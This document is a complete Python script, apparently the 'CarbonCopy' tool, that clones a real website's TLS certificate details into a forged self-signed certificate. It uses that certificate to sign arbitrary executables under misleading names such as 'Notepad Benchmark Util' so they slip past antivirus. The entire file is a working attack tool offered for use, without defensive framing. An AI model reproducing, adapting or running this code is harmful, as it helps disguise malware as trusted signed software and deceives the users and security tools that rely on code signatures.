#!/usr/bin/python3

# Author : Paranoid Ninja
# Email  : paranoidninja@protonmail.com
# Description: Spoofs SSL Certificates and Signs executables to evade Antivirus

import os
import shutil
import ssl
import subprocess
from OpenSSL import crypto
from pathlib import Path
from sys import argv, platform
import logging

TIMESTAMP_URL = "http://sha256timestamp.ws.symantec.com/sha256/timestamp"

# Configure logging for better traceability
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def fetch_certificate(host, port):
    """Fetches the SSL certificate of the given host and port."""
    try:
        logging.info(f"Loading public key of {host} in memory...")
        ogcert = ssl.get_server_certificate((host, int(port)))
        x509 = crypto.load_certificate(crypto.FILETYPE_PEM, ogcert)
        return x509
    except ssl.SSLError as e:
        logging.error(f"SSL Error: {e}")
    except Exception as e:
        logging.error(f"Failed to fetch certificate: {e}")
    return None

def generate_fake_certificate(x509, certDir, host):
    """Generates a fake certificate by cloning the original certificate."""
    try:
        CNCRT   = certDir / (host + ".crt")
        CNKEY   = certDir / (host + ".key")
        PFXFILE = certDir / (host + ".pfx")
        
        # Generate new RSA private key
        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, x509.get_pubkey().bits())
        
        # Clone original certificate's details
        cert = crypto.X509()
        cert.set_version(x509.get_version())
        cert.set_serial_number(x509.get_serial_number())
        cert.set_subject(x509.get_subject())
        cert.set_issuer(x509.get_issuer())
        cert.set_notBefore(x509.get_notBefore())
        cert.set_notAfter(x509.get_notAfter())
        cert.set_pubkey(k)
        cert.sign(k, 'sha256')

        # Save the generated certificate and private key
        logging.info("Creating certificate and key files...")
        CNCRT.write_bytes(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))
        CNKEY.write_bytes(crypto.dump_privatekey(crypto.FILETYPE_PEM, k))

        # Create PKCS12 file for signing executable
        logging.info("Creating PFX file...")
        pfx = crypto.PKCS12()
        pfx.set_privatekey(k)
        pfx.set_certificate(cert)
        pfxdata = pfx.export()
        PFXFILE.write_bytes(pfxdata)

        return PFXFILE
    except Exception as e:
        logging.error(f"Error in generating fake certificate: {e}")
    return None

def sign_executable_with_signtool(signee, signed, pfxfile):
    """Signs the executable using signtool on Windows."""
    try:
        logging.info(f"Signing {signed} using signtool...")
        shutil.copy(signee, signed)
        subprocess.check_call([
            "signtool.exe", "sign", "/v", "/f", pfxfile,
            "/d", "MozDef Corp", "/tr", TIMESTAMP_URL,
            "/td", "SHA256", "/fd", "SHA256", signed
        ])
    except subprocess.CalledProcessError as e:
        logging.error(f"Error signing with signtool: {e}")
    except Exception as e:
        logging.error(f"Unexpected error during signing: {e}")

def sign_executable_with_osslsigncode(signee, signed, pfxfile):
    """Signs the executable using osslsigncode on Linux."""
    try:
        logging.info(f"Signing {signed} using osslsigncode...")
        args = ("osslsigncode", "sign", "-pkcs12", pfxfile,
                "-n", "Notepad Benchmark Util", "-i", TIMESTAMP_URL,
                "-in", signee, "-out", signed)
        subprocess.check_call(args)
    except subprocess.CalledProcessError as e:
        logging.error(f"Error signing with osslsigncode: {e}")
    except Exception as e:
        logging.error(f"Unexpected error during signing: {e}")

def CarbonCopy(host, port, signee, signed):
    """Main function to clone certificate and sign executable."""
    certDir = Path('certs')
    certDir.mkdir(exist_ok=True)

    # Fetch original certificate
    x509 = fetch_certificate(host, port)
    if not x509:
        return
    
    # Generate fake certificate
    PFXFILE = generate_fake_certificate(x509, certDir, host)
    if not PFXFILE:
        return
    
    # Sign executable based on OS
    if platform == "win32":
        sign_executable_with_signtool(signee, signed, PFXFILE)
    else:
        sign_executable_with_osslsigncode(signee, signed, PFXFILE)

def main():
    """Main entry point."""
    logging.info("CarbonSigner v1.0")
    if len(argv) != 5:
        logging.error(f"Usage: {argv[0]} <hostname> <port> <build-executable> <signed-executable>")
        return
    CarbonCopy(argv[1], argv[2], argv[3], argv[4])

if __name__ == "__main__":
    main()
